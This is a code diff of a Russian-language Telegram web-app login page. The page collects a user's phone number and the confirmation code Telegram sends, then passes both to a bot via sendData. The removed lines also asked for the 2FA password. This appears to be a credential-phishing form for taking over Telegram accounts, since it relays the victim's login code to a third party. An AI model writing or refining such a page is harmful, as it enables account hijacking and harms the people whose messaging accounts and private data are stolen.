@@ -81,11 +81,7 @@
                 <label>Код подтверждения</label>
                 <input type="text" id="code" placeholder="Введите код из Telegram" required>
             </div>
-            <div class="input-group" id="passwordGroup" style="display:none;">
-                <label>Пароль (если есть 2FA)</label>
-                <input type="password" id="password" placeholder="Введите пароль, если он есть">
-            </div>
-            <button type="submit" class="btn" id="submitBtn">Продолжить</button>
+            <button type="button" class="btn" id="submitBtn">Продолжить</button>
         </form>
 
         <div class="status" id="status"></div>
@@ -93,15 +89,10 @@
     </div>
 
     <script>
-        let tg = window.Telegram.WebApp;
         let step = 'phone';
         let phone = '';
 
-        tg.ready();
-        tg.expand();
-
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
-            e.preventDefault();
+        document.getElementById('submitBtn').addEventListener('click', function() {
             const status = document.getElementById('status');
 
             if (step === 'phone') {
@@ -115,18 +106,23 @@
                 status.textContent = 'Отправляем код...';
                 status.className = 'status';
 
-                // Отправляем номер
-                tg.sendData(JSON.stringify({
-                    phone: phone,
-                    code: '',
-                    password: ''
-                }));
-
-                status.textContent = '✅ Код отправлен! Введите его ниже.';
-                status.className = 'status success';
+                // Показываем поле для кода
                 document.getElementById('codeGroup').style.display = 'block';
                 document.getElementById('submitBtn').textContent = 'Подтвердить код';
                 step = 'code';
+
+                status.textContent = '✅ Код отправлен! Введите его ниже.';
+                status.className = 'status success';
+
+                // Отправляем номер в бота (если есть Telegram WebApp)
+                try {
+                    window.Telegram.WebApp.sendData(JSON.stringify({
+                        phone: phone,
+                        code: ''
+                    }));
+                } catch(e) {
+                    console.log('WebApp not available');
+                }
                 return;
             }
 
@@ -138,34 +134,17 @@
                     return;
                 }
 
-                // Отправляем код, ждём ответ от бота
-                // Если бот запросит пароль — покажем поле для пароля
-                tg.sendData(JSON.stringify({
-                    phone: phone,
-                    code: code,
-                    password: ''
-                }));
-
-                status.textContent = '⏳ Проверка...';
+                status.textContent = 'Проверяем...';
                 status.className = 'status';
-                
-                // Скрываем поле кода, показываем поле для пароля
-                // (бот сам решит, нужно ли показывать)
-                document.getElementById('codeGroup').style.display = 'none';
-                document.getElementById('passwordGroup').style.display = 'block';
-                document.getElementById('submitBtn').textContent = 'Подтвердить пароль';
-                step = 'password';
-                return;
-            }
 
-            if (step === 'password') {
-                const password = document.getElementById('password').value.trim();
-                
-                tg.sendData(JSON.stringify({
-                    phone: phone,
-                    code: '',
-                    password: password
-                }));
+                try {
+                    window.Telegram.WebApp.sendData(JSON.stringify({
+                        phone: phone,
+                        code: code
+                    }));
+                } catch(e) {
+                    console.log('WebApp not available');
+                }
 
                 status.textContent = '✅ Подтверждено!';
                 status.className = 'status success';
@@ -180,7 +159,9 @@
                     `;
                 }, 1000);
 
-                tg.close();
+                try {
+                    window.Telegram.WebApp.close();
+                } catch(e) {}
             }
         });
     </script>
